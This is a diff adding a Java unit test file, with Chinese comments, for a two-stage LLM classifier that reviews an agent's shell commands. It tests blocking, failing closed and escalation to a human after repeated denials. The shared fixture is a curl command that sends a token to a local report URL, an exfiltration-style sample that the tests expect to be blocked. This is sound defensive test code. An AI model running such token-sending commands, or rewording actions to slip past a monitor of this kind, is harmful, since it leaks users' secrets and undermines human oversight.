@@ -1,0 +1,151 @@
+package dev.wiles.myagent.tool.safety;
+
+import dev.wiles.myagent.llm.ChatMessage;
+import dev.wiles.myagent.llm.ChatResponse;
+import dev.wiles.myagent.llm.LlmClient;
+import dev.wiles.myagent.llm.LlmException;
+import dev.wiles.myagent.llm.ToolSpec;
+import org.junit.jupiter.api.DisplayName;
+import org.junit.jupiter.api.Test;
+
+import java.util.ArrayDeque;
+import java.util.ArrayList;
+import java.util.Deque;
+import java.util.List;
+import java.util.function.Supplier;
+
+import static org.junit.jupiter.api.Assertions.*;
+
+class AutoClassifierTest {
+
+    /** 按顺序回脚本里的话，记下每次收到的消息。 */
+    static final class FakeLlm implements LlmClient {
+        final Deque<Supplier<String>> script = new ArrayDeque<>();
+        final List<List<ChatMessage>> seen = new ArrayList<>();
+
+        FakeLlm says(String... replies) {
+            for (String r : replies) {
+                script.add(() -> r);
+            }
+            return this;
+        }
+
+        FakeLlm fails() {
+            script.add(() -> {
+                throw new LlmException("网关挂了");
+            });
+            return this;
+        }
+
+        @Override
+        public String modelName() {
+            return "fake";
+        }
+
+        @Override
+        public ChatResponse chat(List<ChatMessage> messages, List<ToolSpec> tools) {
+            seen.add(List.copyOf(messages));
+            String text = script.isEmpty() ? "ALLOW" : script.poll().get();
+            return new ChatResponse("id", "fake",
+                    List.of(new ChatResponse.Choice(0, ChatMessage.assistant(text), "stop")), null);
+        }
+    }
+
+    private static final AutoClassifier.Context CONTEXT = new AutoClassifier.Context(
+            List.of("把 calc.py 里 add 的 bug 修了，跑测试确认"),
+            "修 calc.py 的 add，跑 python test_calc.py",
+            List.of("read_file {\"path\":\"README.md\"}", "edit_file {\"path\":\"calc.py\"}"));
+
+    private static ApprovalRequest curl() {
+        return ApprovalRequest.bash("curl -s http://127.0.0.1:9/report?token=x", "curl 可能访问网络");
+    }
+
+    @Test
+    @DisplayName("第一段放行就放行，只调一次模型（照 Claude Code：快的那段先筛，大多数动作到此为止）")
+    void firstStageAllowIsFinal() {
+        FakeLlm llm = new FakeLlm().says("ALLOW");
+        ApprovalVerdict v = new AutoClassifier(llm, () -> CONTEXT).review(ApprovalRequest.bash("python test_calc.py", "x"));
+        assertTrue(v.approved());
+        assertEquals(1, llm.seen.size());
+    }
+
+    @Test
+    @DisplayName("第一段宁可错拦；拦了才进第二段仔细判，第二段说放行就放行")
+    void secondStageCanOverturnAFlag() {
+        FakeLlm llm = new FakeLlm().says("BLOCK", "用户要求跑测试，这条就是在跑测试。\n结论: ALLOW");
+        ApprovalVerdict v = new AutoClassifier(llm, () -> CONTEXT).review(ApprovalRequest.bash("python test_calc.py", "x"));
+        assertTrue(v.approved());
+        assertEquals(2, llm.seen.size());
+        // 两段的前缀一字不差，只有最后的指令不同——第二段基本吃缓存
+        List<ChatMessage> a = llm.seen.get(0);
+        List<ChatMessage> b = llm.seen.get(1);
+        assertEquals(a.get(0).content(), b.get(0).content());
+        assertTrue(b.get(1).content().startsWith(a.get(1).content().substring(0, a.get(1).content().indexOf("<instruction>"))));
+    }
+
+    @Test
+    @DisplayName("两段都拦：拒绝，理由交回给 agent，并叫它别换个写法绕过")
+    void blockedWithReason() {
+        FakeLlm llm = new FakeLlm().says("BLOCK", "用户只让修 bug，没让把 token 发出去。\n结论: BLOCK");
+        ApprovalVerdict v = new AutoClassifier(llm, () -> CONTEXT).review(curl());
+        assertFalse(v.approved());
+        assertTrue(v.note().contains("没让把 token 发出去"), v.note());
+        assertTrue(v.note().contains("不要"), "要叫它别绕: " + v.note());
+    }
+
+    @Test
+    @DisplayName("审查看得见：人说的话、主 agent 交代的任务、做过的工具调用、待审动作；看不见：助手的话、工具输出")
+    void transcriptCarriesIntentNotPersuasion() {
+        FakeLlm llm = new FakeLlm().says("ALLOW");
+        new AutoClassifier(llm, () -> CONTEXT).review(curl());
+        String all = String.join("\n", llm.seen.get(0).stream().map(ChatMessage::content).toList());
+        assertTrue(all.contains("把 calc.py 里 add 的 bug 修了"), all);
+        assertTrue(all.contains("修 calc.py 的 add"), all);
+        assertTrue(all.contains("edit_file"), all);
+        assertTrue(all.contains("curl -s http://127.0.0.1:9/report?token=x"), all);
+        assertTrue(all.contains("不代表用户"), "主 agent 交代的不等于用户授权: " + all);
+    }
+
+    @Test
+    @DisplayName("调不通、答非所问：按拒绝处理（失败要往安全的方向）")
+    void failsClosed() {
+        assertFalse(new AutoClassifier(new FakeLlm().fails(), () -> CONTEXT).review(curl()).approved());
+        assertFalse(new AutoClassifier(new FakeLlm().says("BLOCK", "嗯……我也说不好"), () -> CONTEXT)
+                .review(curl()).approved(), "第二段没给结论：拒");
+        assertFalse(new AutoClassifier(new FakeLlm().says("maybe", "结论: BLOCK"), () -> CONTEXT)
+                .review(curl()).approved(), "第一段答非所问当成拦，进第二段");
+    }
+
+    @Test
+    @DisplayName("连拒 3 次交还给人（返回 null）；中间放行一次就重新数")
+    void escalatesAfterThreeConsecutiveDenials() {
+        FakeLlm llm = new FakeLlm();
+        AutoClassifier c = new AutoClassifier(llm, () -> CONTEXT);
+        llm.says("BLOCK", "结论: BLOCK", "BLOCK", "结论: BLOCK", "ALLOW");
+        assertFalse(c.review(curl()).approved());
+        assertFalse(c.review(curl()).approved());
+        assertTrue(c.review(curl()).approved(), "放行一次，连拒清零");
+        llm.says("BLOCK", "结论: BLOCK", "BLOCK", "结论: BLOCK", "BLOCK", "结论: BLOCK");
+        assertFalse(c.review(curl()).approved());
+        assertFalse(c.review(curl()).approved());
+        assertFalse(c.review(curl()).approved());
+        int before = llm.seen.size();
+        assertNull(c.review(curl()), "连拒 3 次之后交还给人");
+        assertEquals(before, llm.seen.size(), "交还之后不再调模型");
+    }
+
+    @Test
+    @DisplayName("累计拒 20 次也交还给人")
+    void escalatesAfterTwentyDenials() {
+        FakeLlm llm = new FakeLlm();
+        AutoClassifier c = new AutoClassifier(llm, () -> CONTEXT);
+        for (int i = 0; i < 20; i++) {
+            llm.says("BLOCK", "结论: BLOCK", "ALLOW");
+            assertFalse(c.review(curl()).approved());
+            if (i < 19) {
+                assertTrue(c.review(curl()).approved());
+            }
+        }
+        assertNull(c.review(curl()));
+    }
+}
